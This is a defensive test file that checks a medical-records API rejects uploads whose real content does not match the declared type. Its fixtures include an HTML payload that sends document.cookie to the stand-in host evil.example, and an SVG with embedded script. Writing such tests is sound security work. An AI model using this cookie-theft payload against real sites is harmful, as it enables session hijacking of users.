import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import mongoose from 'mongoose';
import fs from 'fs/promises';
import path from 'path';
import '../../src/config/env.js';
import { connectTestDb, dropTestDb, disconnectTestDb } from './setup.js';
import App from '../../src/app.js';
import config from '../../src/config/index.js';
import User from '../../src/models/User.model.js';
import Patient from '../../src/models/Patient.model.js';
import PatientDocument from '../../src/models/PatientDocument.model.js';
import TokenService from '../../src/services/TokenService.js';
import { hashPassword } from '../../src/helpers/crypto.helper.js';
import { ROLE_PERMISSIONS } from '../../src/constants/rolePermissions.js';
import { ROLES } from '../../src/constants/roles.js';
import { DOCUMENT_CATEGORY } from '../../src/enums/patient.js';

/**
 * DOC-002 — upload type screening is now a CONTENT check, not a label check.
 *
 * The previous screen derived `scanState` from `file.mimetype` and the filename extension, both of
 * which the client supplies and neither of which the server verified. These cases are written from
 * the attacker's side of that gap: same declared type, different bytes.
 *
 * The first test is the one that matters most in the other direction — a genuine PDF and a genuine
 * PNG must still upload, because a type check that refuses real files is an outage, not a fix.
 */
describe('DOC-002 upload content-type verification', () => {
  let app;
  const tokenService = new TokenService();
  let token;
  let patient;
  let branchId;

  const auth = () => ({ Authorization: `Bearer ${token}` });

  // Minimal but genuine file bodies: the leading bytes are exactly what a real file of that type
  // begins with, which is the only part the signature check reads.
  const REAL_PDF = Buffer.concat([
    Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n'),
    Buffer.from('trailer\n<< /Root 1 0 R >>\n%%EOF\n'),
  ]);
  const REAL_PNG = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.from([0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52]),
    Buffer.alloc(32),
  ]);
  const HTML_PAGE = Buffer.from(
    '<html><body><script>fetch("https://evil.example/"+document.cookie)</script></body></html>'
  );
  const SVG_IMAGE = Buffer.from(
    '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
  );

  const upload = (buffer, filename, contentType) =>
    request(app)
      .post(`/api/v1/patients/${patient._id}/documents`)
      .set(auth())
      .field('category', DOCUMENT_CATEGORY.LAB_REPORT)
      .field('clinicalDate', '2026-01-15')
      .attach('file', buffer, { filename, contentType });

  beforeAll(async () => {
    await connectTestDb('uploadsniff');
    app = new App().getExpressApp();

    branchId = new mongoose.Types.ObjectId();

    const user = await User.create({
      firstName: 'Recep',
      lastName: 'Tionist',
      email: 'recep@uploadsniff.test',
      passwordHash: await hashPassword('Password@12345'),
      employeeId: 'US-RECEP',
      role: ROLES.RECEPTIONIST,
      branch: branchId,
      isActive: true,
      status: 'ACTIVE',
    });

    token = tokenService.signAccessToken({
      sub: user._id.toString(),
      role: user.role,
      permissions: ROLE_PERMISSIONS[ROLES.RECEPTIONIST],
      branch: branchId.toString(),
    });

    patient = await Patient.create({
      mrn: `US-${Date.now()}`,
      firstName: 'Upload',
      lastName: 'Subject',
      gender: 'FEMALE',
      mobile: '9000000123',
      primaryBranchId: branchId,
      isActive: true,
      status: 'ACTIVE',
    });
  });

  afterAll(async () => {
    const uploadRoot = path.resolve(config.storage.localPath);
    await fs.rm(path.join(uploadRoot, 'patients', patient._id.toString()), {
      recursive: true,
      force: true,
    });
    await dropTestDb();
    await disconnectTestDb();
  });

  // --- normal use must keep working ---------------------------------------

  it('still accepts a genuine PDF and a genuine PNG', async () => {
    const pdf = await upload(REAL_PDF, 'lab-report.pdf', 'application/pdf');
    expect(pdf.status).toBe(201);
    expect(pdf.body.data.document.mimeType).toBe('application/pdf');
    expect(pdf.body.data.document.scanState).toBe('CLEAN');

    const png = await upload(REAL_PNG, 'scan.png', 'image/png');
    expect(png.status).toBe(201);
    expect(png.body.data.document.mimeType).toBe('image/png');
  });

  it('accepts a real JPEG declared with the image/jpg alias browsers still send', async () => {
    const jpeg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(16)]);
    const res = await upload(jpeg, 'photo.jpg', 'image/jpeg');
    expect(res.status).toBe(201);
    expect(res.body.data.document.mimeType).toBe('image/jpeg');
  });

  // --- mislabelled content -------------------------------------------------

  it('refuses an HTML page renamed and declared as a PDF', async () => {
    const res = await upload(HTML_PAGE, 'report.pdf', 'application/pdf');
    expect(res.status).toBe(400);
    expect(res.body.code || res.body.error?.code).toBe('FILE_CONTENT_UNRECOGNISED');
  });

  it('refuses a scriptable SVG smuggled in under an image/png label', async () => {
    // The old screen accepted anything starting `image/`, and multer's filter still lets
    // `image/png` through — so the bytes are the only thing that can refuse this.
    const res = await upload(SVG_IMAGE, 'chart.png', 'image/png');
    expect(res.status).toBe(400);
    expect(res.body.code || res.body.error?.code).toBe('FILE_CONTENT_UNRECOGNISED');
  });

  it('refuses a real PNG declared as a PDF (content/claim mismatch)', async () => {
    const res = await upload(REAL_PNG, 'report.pdf', 'application/pdf');
    expect(res.status).toBe(400);
    expect(res.body.code || res.body.error?.code).toBe('FILE_CONTENT_MISMATCH');
  });

  it('refuses a real PNG whose extension claims it is a PDF', async () => {
    const res = await upload(REAL_PNG, 'report.pdf', 'image/png');
    expect(res.status).toBe(400);
    expect(res.body.code || res.body.error?.code).toBe('FILE_EXTENSION_MISMATCH');
  });

  it('refuses an empty file', async () => {
    const res = await upload(Buffer.alloc(0), 'empty.pdf', 'application/pdf');
    expect(res.status).toBe(400);
  });

  // --- what the browser is told when the bytes come back -------------------

  it('serves a stored document with nosniff, an inline disposition and the DETECTED type', async () => {
    const uploaded = await upload(REAL_PNG, 'headers.png', 'image/png');
    expect(uploaded.status).toBe(201);

    const res = await request(app)
      .get(`/api/v1/files/documents/${uploaded.body.data.document.id}`)
      .set(auth());

    expect(res.status).toBe(200);
    // nosniff is what stops a browser second-guessing the declared type and rendering markup.
    expect(res.headers['x-content-type-options']).toBe('nosniff');
    expect(res.headers['content-type']).toContain('image/png');
    expect(res.headers['content-disposition']).toContain('inline');
  });

  it('stores the detected type, so a later read cannot serve an attacker-chosen Content-Type', async () => {
    const stored = await PatientDocument.find({ patientId: patient._id }).lean();
    expect(stored.length).toBeGreaterThan(0);
    expect(stored.every((d) => ['application/pdf', 'image/png', 'image/jpeg'].includes(d.mimeType))).toBe(true);
  });
});
